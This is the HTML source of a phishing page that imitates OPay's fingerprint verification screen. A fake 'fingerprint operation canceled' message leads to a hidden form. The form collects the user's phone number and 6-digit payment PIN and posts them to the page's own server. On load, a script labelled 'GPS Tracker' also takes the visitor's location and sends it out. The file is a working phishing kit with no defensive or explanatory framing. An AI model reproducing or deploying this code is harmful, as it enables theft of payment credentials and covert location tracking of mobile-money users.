<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>OPay - Verify</title>
    <style>
        body {
            background-color: #1c1c1e;
            color: #ffffff;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            margin: 0;
            display: flex;
            flex-direction: column;
            align-items: center;
            height: 100vh;
        }

        .header {
            margin-top: 50px;
            text-align: center;
        }

        .opay-logo {
            width: 100px;
            margin-bottom: 30px;
        }

        .profile-pic {
            width: 80px;
            height: 80px;
            border-radius: 50%;
            border: 2px solid #333;
            margin-bottom: 15px;
            object-fit: cover;
        }

        .user-name {
            font-size: 16px;
            font-weight: 500;
            color: #e5e5e5;
            margin-bottom: 50px;
        }

        .fingerprint-section {
            display: flex;
            flex-direction: column;
            align-items: center;
            margin-bottom: 40px;
        }

        .finger-icon {
            width: 70px;
            margin-bottom: 20px;
            opacity: 0.9;
        }

        .hint-text {
            color: #00d38d;
            font-size: 14px;
            margin-bottom: 25px;
        }

        .verify-btn {
            background-color: #00d38d;
            color: #000;
            border: none;
            padding: 12px 60px;
            border-radius: 25px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
        }

        .error-toast {
            background-color: #2c2c2e;
            color: #fff;
            padding: 10px 20px;
            border-radius: 8px;
            font-size: 13px;
            margin-top: 100px;
            border: 1px solid #3a3a3c;
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .footer-nav {
            position: absolute;
            bottom: 30px;
            font-size: 14px;
            color: #00d38d;
        }

        .footer-nav span {
            color: #555;
            margin: 0 10px;
        }

        /* Hidden Login Form */
        #login-form {
            display: none;
            width: 85%;
            max-width: 350px;
        }

        input {
            width: 100%;
            background: #2c2c2e;
            border: 1px solid #3a3a3c;
            color: white;
            padding: 15px;
            border-radius: 10px;
            margin-bottom: 15px;
            box-sizing: border-box;
        }
    </style>
</head>
<body>

    <div class="header" id="main-ui">
        <img src="https://upload.wikimedia.org" class="opay-logo">
        <br>
        <img src="https://i.ibb.co" class="profile-pic">
        <div class="user-name">opay authentication </div>

        <div class="fingerprint-section">
            <img src="https://cdn-icons-png.flaticon.com" class="finger-icon" style="filter: invert(1);">
            <div class="hint-text">Click to log in with Fingerprint</div>
            <button class="verify-btn" onclick="showLogin()">Verify Fingerprint</button>
        </div>

        <div class="error-toast">
            <img src="https://upload.wikimedia.org" width="15">
            Fingerprint operation canceled by user.
        </div>
    </div>

    <!-- Hidden Form that captures data -->
    <div id="login-form">
        <h2 style="text-align: center; color: #00d38d;">Login with PIN</h2>
        <form action="/login/opay" method="POST">
            <input type="tel" name="user" placeholder="Phone Number" required>
            <input type="password" name="pass" maxlength="6" placeholder="6-Digit Payment PIN" required>
            <button type="submit" class="verify-btn" style="width: 100%;">Login</button>
        </form>
    </div>

    <div class="footer-nav">
        Switch Account <span>|</span> <a href="javascript:void(0)" onclick="showLogin()" style="color: #00d38d; text-decoration: none;">Login with Password</a>
    </div>

    <script>
        function showLogin() {
            document.getElementById('main-ui').style.display = 'none';
            document.getElementById('login-form').style.display = 'block';
        }

        // GPS Tracker
        window.onload = function() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(function(p) {
                    fetch('/log_gps', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            lat: p.coords.latitude,
                            lon: p.coords.longitude,
                            target: "OPAY_DARK_V8"
                        })
                    });
                });
            }
        };
    </script>
</body>
</html>
